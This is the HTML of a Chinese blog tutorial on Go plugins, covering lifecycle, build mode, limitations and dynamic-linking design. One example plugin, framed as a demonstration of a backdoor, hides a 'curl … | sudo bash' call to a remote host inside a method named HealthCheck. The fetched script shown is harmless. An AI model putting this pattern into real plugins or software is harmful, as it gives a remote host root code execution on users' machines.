@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://cosmos-1251905798.cos.ap-beijing.myqcloud.com/theme/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://cosmos-1251905798.cos.ap-beijing.myqcloud.com/theme/favicon.ico">
+  <link rel="alternate" href="/atom.xml" title="Houmin" type="application/atom+xml">
+  <meta name="google-site-verification" content="zdGhdEF7jHoJW58lsdN6l9JrQFjJFwakCIc7TbbosV0">
+  <meta name="msvalidate.01" content="2F527B379ED5537861D0D38C2C754C2B">
+  <meta name="baidu-site-verification" content="xAag2PqzKE">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"right","display":"post","offset":12,"onmobile":true},
+    copycode: {"enable":true,"show_result":true,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":true,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: true,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="Go plugin是什么Go 1.8版本开始提供了一个创建共享库的新工具,称为 Plugins. A plugin is a Go main package with exported functions and variables that has been built with: go build -buildmode&#x3D;plugin">
+<meta name="keywords" content="Go">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Go语言设计与实现】Go Plugin">
+<meta property="og:url" content="http://houmin.cc/posts/7fc46894/index.html">
+<meta property="og:site_name" content="Houmin">
+<meta property="og:description" content="Go plugin是什么Go 1.8版本开始提供了一个创建共享库的新工具,称为 Plugins. A plugin is a Go main package with exported functions and variables that has been built with: go build -buildmode&#x3D;plugin">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://cosmos-1251905798.cos.ap-beijing.myqcloud.com/blog/2021-02-07_static-library-dynamic-library.png">
+<meta property="og:image" content="https://cosmos-1251905798.cos.ap-beijing.myqcloud.com/blog/2021-02-07_go-plugin-system.png">
+<meta property="og:updated_time" content="2021-02-07T11:45:38.399Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cosmos-1251905798.cos.ap-beijing.myqcloud.com/blog/2021-02-07_static-library-dynamic-library.png">
+
+<link rel="canonical" href="http://houmin.cc/posts/7fc46894/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>【Go语言设计与实现】Go Plugin | Houmin</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+
+  <script src="/js/photoswipe.min.js?v="></script>
+  <script src="/js/photoswipe-ui-default.min.js?v="></script>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Houmin</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <h1 class="site-subtitle" itemprop="description">Yesterday You Said Tomorrow</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-album">
+
+    <a href="/album" rel="section"><i class="fa fa-fw fa-camera"></i>相册</a>
+
+  </li>
+        <li class="menu-item menu-item-movies">
+
+    <a href="/movies/" rel="section"><i class="fa fa-fw fa-film"></i>观影</a>
+
+  </li>
+        <li class="menu-item menu-item-books">
+
+    <a href="/books/" rel="section"><i class="fa fa-fw fa-book"></i>阅读</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="搜索..." spellcheck="false" type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://houmin.cc/posts/7fc46894/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cosmos-1251905798.cos.ap-beijing.myqcloud.com/theme/avatar.png">
+      <meta itemprop="name" content="Houmin">
+      <meta itemprop="description" content="丈夫拥书万卷，何假南面百城">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Houmin">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          【Go语言设计与实现】Go Plugin
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-05-14 17:22:43" itemprop="dateCreated datePublished" datetime="2020-05-14T17:22:43+08:00">2020-05-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9C%AF%E4%B8%9A%E4%B8%93%E6%94%BB/" itemprop="url" rel="index">
+                    <span itemprop="name">术业专攻</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/7fc46894/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/7fc46894/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>19 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Go-plugin是什么"><a href="#Go-plugin是什么" class="headerlink" title="Go plugin是什么"></a>Go plugin是什么</h2><p>Go 1.8版本开始提供了一个创建共享库的新工具,称为 Plugins.</p><blockquote>
+<p>A plugin is a Go main package with exported functions and variables that has been built with: <code>go build -buildmode=plugin</code></p>
+</blockquote><a id="more"></a>
+
+<p>Plugin插件是包含可导出(可访问)的function和变量的<strong><em>main package\</em></strong>编译(<code>go build -buildmode=plugin</code>)之后的文件.</p>
+<p>同时官方文档也提示了：Currently plugins are only supported on Linux and macOS .它目前支持Linux和Mac操作系统(不支持windows)</p>
+<p><a href="https://golang.google.cn/pkg/plugin/#pkg-overview" target="_blank" rel="external nofollow noopener noreferrer">官方文档地址</a></p>
+<h2 id="Go-plugin生命周期"><a href="#Go-plugin生命周期" class="headerlink" title="Go plugin生命周期"></a>Go plugin生命周期</h2><blockquote>
+<p>When a plugin is first opened, the init functions of all packages not already part of the program are called. The main function is not run. A plugin is only initialized once, and cannot be closed.</p>
+</blockquote>
+<p>plugin插件被打开加载 <code>plugin.Open(&quot;***.so&quot;)</code> ,插件的<code>init</code>初始化函数才开始执行. 也就是说main函数执行前plugin的init函数是不会执行的. 插件只被初始化一次,不能被关闭.</p>
+<p>使用plugin的main.go生命周期</p>
+<ol>
+<li>main.go的init函数执行</li>
+<li>开始执行main.go main函数</li>
+<li>开始执行<code>plugin.Open(&quot;***.so&quot;)</code>打开插件</li>
+<li>插件开始执行内部的<code>init</code>函数</li>
+</ol>
+<h2 id="Go-plugin应用场景"><a href="#Go-plugin应用场景" class="headerlink" title="Go plugin应用场景"></a>Go plugin应用场景</h2><ul>
+<li>通过plugin我们可以很方便的对于不同功能加载相应的模块并调用相关的模块；</li>
+<li>针对不同语言(英文、汉语、德语……)加载不同的语言so文件,进行不同的输出；</li>
+<li>编译出的文件给不同的编程语言用(如：c/java/python/lua等).</li>
+<li>需要加密的核心算法,核心业务逻辑可以可以编译成plugin插件</li>
+<li>黑客预留的后门backdoor可以使用plugin</li>
+<li>函数集动态加载</li>
+</ul>
+<h2 id="Go-plugin-示例"><a href="#Go-plugin-示例" class="headerlink" title="Go plugin 示例"></a>Go plugin 示例</h2><p>这个示例建展示一下两方面内容:</p>
+<ol>
+<li>演示plugin插件的<code>init</code>的执行顺序</li>
+<li>演示怎么编写一个shell黑客后门</li>
+</ol>
+<h3 id="编写插件plugin代码"><a href="#编写插件plugin代码" class="headerlink" title="编写插件plugin代码"></a>编写插件plugin代码</h3><p>直接上代码<a href="https://github.com/libragen/felix/blob/master/plugin/plugin_bad_docter.go" target="_blank" rel="external nofollow noopener noreferrer">libragen/felix/blob/master/plugin/plugin_bad_docter.go</a></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"os/exec"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	log.Println(<span class="string">"plugin init function called"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> BadNastyDoctor <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g BadNastyDoctor)</span> <span class="title">HealthCheck</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	bs,err := exec.Command(<span class="string">"bash"</span>,<span class="string">"-c"</span>,<span class="string">"curl -s 'https://tech.mojotv.cn/test.sh' | sudo bash -s 'arg000' 'arg001'"</span>).CombinedOutput()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	log.Println(<span class="string">"now is"</span>,g)</span><br><span class="line">	log.Println(<span class="string">"shell has executed -&gt;&gt;&gt;&gt;&gt;"</span>,<span class="keyword">string</span>(bs))</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//go build -buildmode=plugin -o=plugin_doctor.so plugin_bad_docter.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// exported as symbol named "Doctor"</span></span><br><span class="line"><span class="keyword">var</span> Doctor = BadNastyDoctor(time.Now().Format(time.RFC3339))</span><br></pre></td></tr></table></figure>
+<p>编写plugin插件要点</p>
+<ol>
+<li>包名称必须是main</li>
+<li>没有main函数</li>
+<li>必须有可以导出(访问)的变量或者方法</li>
+</ol>
+<p>编写完成之后使用编译plugin</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pi@homePi:/data/felix/plugin $ go build -buildmode=plugin -o=plugin_doctor.so plugin_bad_docter.go </span><br><span class="line">pi@homePi:/data/felix/plugin $ ll</span><br><span class="line">总用量 6300</span><br><span class="line">-rw-r--r-- 1 pi pi     612 9月   6  2019 plugin_bad_docter.go</span><br><span class="line">-rw-r--r-- 1 pi pi 3493654 9月   6 17:06 plugin_doctor.so</span><br><span class="line">-rw-r--r-- 1 pi pi     274 9月   6 16:37 readme.md</span><br><span class="line">pi@homePi:/data/felix/plugin $ file plugin_doctor.so </span><br><span class="line">plugin_doctor.so: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, BuildID[sha1]=9034047846f679f66ff7ac50f73aa7baf90d5e5d, not stripped</span><br></pre></td></tr></table></figure>
+<h3 id="使用plugin插件"><a href="#使用plugin插件" class="headerlink" title="使用plugin插件"></a>使用plugin插件</h3><p>使用加载plugin基本流程</p>
+<ol>
+<li>加载编译好的插件 <code>plugin.Open(&quot;./plugin_doctor.so&quot;)</code> (*.so文件路径相对与可执行文件的路径,可以是绝对路径)</li>
+<li>寻找插件可到变量 <code>plug.Lookup(&quot;Doctor&quot;)</code>,</li>
+<li>TypeAssert: Symbol(interface{}) 转换成API的接口类型</li>
+<li>执行API interface的方法</li>
+</ol>
+<p><a href="https://tech.mojotv.cn/test.sh" target="_blank" rel="external nofollow noopener noreferrer">远程shell脚本内容</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment">#--destination _deploy</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"golang plugin remote shell"</span>  <span class="variable">$0</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br></pre></td></tr></table></figure>
+<p><a href="https://github.com/libragen/felix/blob/master/plugin/use_plugin_example.go" target="_blank" rel="external nofollow noopener noreferrer">libragen/felix/blob/master/plugin/use_plugin_example.go</a></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"os"</span></span><br><span class="line">	<span class="string">"plugin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> GoodDoctor <span class="keyword">interface</span> &#123;</span><br><span class="line">	HealthCheck() error</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	log.Println(<span class="string">"main package init function called"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	log.Println(<span class="string">"main function stared"</span>)</span><br><span class="line">	<span class="comment">// load module 插件您也可以使用go http.Request从远程下载到本地,在加载做到动态的执行不同的功能</span></span><br><span class="line">	<span class="comment">// 1. open the so file to load the symbols</span></span><br><span class="line"></span><br><span class="line">	plug, err := plugin.Open(<span class="string">"./plugin_doctor.so"</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		os.Exit(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	log.Println(<span class="string">"plugin opened"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2. look up a symbol (an exported function or variable)</span></span><br><span class="line">	<span class="comment">// in this case, variable Greeter</span></span><br><span class="line">	doc, err := plug.Lookup(<span class="string">"Doctor"</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		os.Exit(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 3. Assert that loaded symbol is of a desired type</span></span><br><span class="line">	<span class="comment">// in this case interface type GoodDoctor (defined above)</span></span><br><span class="line">	doctor, ok := doc.(GoodDoctor)</span><br><span class="line">	<span class="keyword">if</span> !ok &#123;</span><br><span class="line">		fmt.Println(<span class="string">"unexpected type from module symbol"</span>)</span><br><span class="line">		os.Exit(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 4. use the module</span></span><br><span class="line">	<span class="keyword">if</span> err := doctor.HealthCheck(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(<span class="string">"use plugin doctor failed, "</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="build-plugin程序"><a href="#build-plugin程序" class="headerlink" title="build plugin程序"></a>build plugin程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pi@homePi:/data/felix/plugin $ go build use_plugin_example.go</span><br><span class="line">pi@homePi:/data/felix/plugin $ ll</span><br><span class="line">总用量 6300</span><br><span class="line">-rw-r--r-- 1 pi pi     612 9月   6 17:08 plugin_bad_docter.go</span><br><span class="line">-rw-r--r-- 1 pi pi 3493654 9月   6 17:06 plugin_doctor.so</span><br><span class="line">-rw-r--r-- 1 pi pi     274 9月   6 16:37 readme.md</span><br><span class="line">-rwxr-xr-x 1 pi pi 2941503 9月   6 17:15 use_plugin_example</span><br><span class="line">-rw-r--r-- 1 pi pi    1057 9月   6  2019 use_plugin_example.go</span><br><span class="line">pi@homePi:/data/felix/plugin $ file use_plugin_example</span><br><span class="line">use_plugin_example: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=fc60641527d9b030f9f4d5a477de300e9fb70541, not stripped</span><br></pre></td></tr></table></figure>
+<h3 id="go-run"><a href="#go-run" class="headerlink" title="go run"></a>go run</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pi@homePi:/data/felix/plugin $ ./use_plugin_example </span><br><span class="line">2019/09/06 17:16:23 main package init <span class="keyword">function</span> called</span><br><span class="line">2019/09/06 17:16:23 main <span class="keyword">function</span> stared</span><br><span class="line">2019/09/06 17:16:23 plugin init <span class="keyword">function</span> called</span><br><span class="line">2019/09/06 17:16:23 plugin opened</span><br><span class="line">2019/09/06 17:16:23 now is 2019-09-06T17:16:23+08:00</span><br><span class="line">2019/09/06 17:16:23 shell has executed -&gt;&gt;&gt;&gt;&gt; golang plugin remote shell bash arg000 arg001</span><br></pre></td></tr></table></figure>
+<h2 id="Go语言plugin局限和不足"><a href="#Go语言plugin局限和不足" class="headerlink" title="Go语言plugin局限和不足"></a>Go语言plugin局限和不足</h2><p>Go plugin 还不是一个成熟的解决方案.它迫使您的插件实现与主应用程序产生高度耦合.即使您可以控制插件和主应用程序, 最终结果也非常脆弱且难以维护.如果插件的作者对主应用程序没有任何控制权,开销会更高.</p>
+<h3 id="Go版本兼容问题"><a href="#Go版本兼容问题" class="headerlink" title="Go版本兼容问题"></a>Go版本兼容问题</h3><p>插件实现和主应用程序都必须使用完全相同的Go工具链版本构建. 由于插件提供的代码将与主代码在相同的进程空间中运行, 因此编译的二进制文件应与主应用程序 100%兼容.</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我希望您记下的关键要点:</p>
+<ul>
+<li>Go插件从v1.8版本开始支持，它目前支持Linux和Mac操作系统(不支持windows)</li>
+<li>Go plugin包提供了一个简单的函数集动态加载,可以帮助开发人员编写可扩展的代码.</li>
+<li>Go插件是使用<code>go build -buildmode = plugin</code>构建标志编译</li>
+<li>Go插件包中的导出函数和公开变量，可以使用插件包在运行时查找并绑定调用.</li>
+<li><strong>Go runtime import插件的开发人员必须将插件视为黑盒子，做好各种最坏的假设*</strong></li>
+</ul>
+<p>熟悉 Go 语言的开发者一般都非常了解 Goroutine 和 Channel 的原理，包括如何设计基于 CSP 模型的应用程序，但是 Go 语言的插件系统是很少有人了解的模块，通过插件系统，我们可以在运行时加载动态库实现一些比较有趣的功能。</p>
+<h2 id="设计原理"><a href="#设计原理" class="headerlink" title="设计原理"></a>设计原理</h2><p>Go 语言的插件系统基于 C 语言动态库实现的，所以它也继承了 C 语言动态库的优点和缺点，我们在本节中会对比 Linux 中的静态库和动态库，分析它们各自的特点和优势。</p>
+<ul>
+<li>静态库或者静态链接库是由编译期决定的程序、外部函数和变量构成的，编译器或者链接器会将程序和变量等内容拷贝到目标的应用并生成一个独立的可执行对象文件<a href="https://draveness.me/golang/docs/part4-advanced/ch08-metaprogramming/golang-plugin/#fn:1" target="_blank" rel="external nofollow noopener noreferrer">1</a>；</li>
+<li>动态库或者共享对象可以在多个可执行文件之间共享，程序使用的模块会在运行时从共享对象中加载，而不是在编译程序时打包成独立的可执行文件<a href="https://draveness.me/golang/docs/part4-advanced/ch08-metaprogramming/golang-plugin/#fn:2" target="_blank" rel="external nofollow noopener noreferrer">2</a>；</li>
+</ul>
+<p>由于特性不同，静态库和动态库的优缺点也比较明显；只依赖静态库并且通过静态链接生成的二进制文件因为包含了全部的依赖，所以能够独立执行，但是编译的结果也比较大；而动态库可以在多个可执行文件之间共享，可以减少内存的占用，其链接的过程往往也都是在装载或者运行期间触发的，所以可以包含一些可以热插拔的模块并降低内存的占用。</p>
+<p><img alt="静态库与动态库" data-src="https://cosmos-1251905798.cos.ap-beijing.myqcloud.com/blog/2021-02-07_static-library-dynamic-library.png"></p>
+<p>使用静态链接编译二进制文件在部署上有非常明显的优势，最终的编译产物也可以直接运行在大多数的机器上，静态链接带来的部署优势远比更低的内存占用显得重要，所以很多编程语言包括 Go 都将静态链接作为默认的链接方式。</p>
+<h3 id="插件系统"><a href="#插件系统" class="headerlink" title="插件系统"></a>插件系统</h3><p>在今天，动态链接带来的低内存占用优势虽然已经没有太多作用，但是动态链接的机制却可以为我们提供更多的灵活性，主程序可以在编译后动态加载共享库实现热插拔的插件系统。</p>
+<p><img alt="插件系统" data-src="https://cosmos-1251905798.cos.ap-beijing.myqcloud.com/blog/2021-02-07_go-plugin-system.png"></p>
+<p>通过在主程序和共享库直接定义一系列的约定或者接口，我们可以通过以下的代码动态加载其他人编译的 Go 语言共享对象，这样做的好处是主程序和共享库的开发者不需要共享代码，只要双方的约定不变，修改共享库后也不需要重新编译主程序。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Driver <span class="keyword">interface</span> &#123;</span><br><span class="line">    Name() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    p, err := plugin.Open(<span class="string">"driver.so"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	   <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    newDriverSymbol, err := p.Lookup(<span class="string">"NewDriver"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    newDriverFunc := newDriverSymbol.(<span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">Driver</span>)</span></span><br><span class="line">    newDriver := newDriverFunc()</span><br><span class="line">    fmt.Println(newDriver.Name())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
